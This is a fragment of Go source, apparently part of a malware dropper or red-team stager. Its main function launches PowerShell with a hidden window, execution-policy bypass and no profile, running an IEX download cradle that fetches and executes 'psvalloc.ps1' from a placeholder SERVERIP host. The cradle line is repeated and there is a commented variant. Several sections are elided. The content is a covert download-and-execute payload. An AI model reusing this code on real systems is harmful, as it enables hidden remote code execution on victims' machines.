...
func main() {
	...
	if os64check() {
		...
		cmdArgs := []string{"-w", "hidden", "-ep", "bypass", "-nop", "-c", "IEX ((new-object net.webclient).downloadstring('http://SERVERIP/outfiles/psvalloc.ps1'))"}
		...
		cmdName := `PowerShell`
		cmdArgs := []string{"-w", "hidden", "-ep", "bypass", "-nop", "-c", "IEX ((new-object net.webclient).downloadstring('http://SERVERIP/outfiles/psvalloc.ps1'))"}
		//cmdArgs := []string{"-Command", "IEX ((new-object net.webclient).downloadstring('http://SERVERIP/outfiles/psvalloc.ps1'))"}
		cmd := exec.Command(cmdName, cmdArgs...)
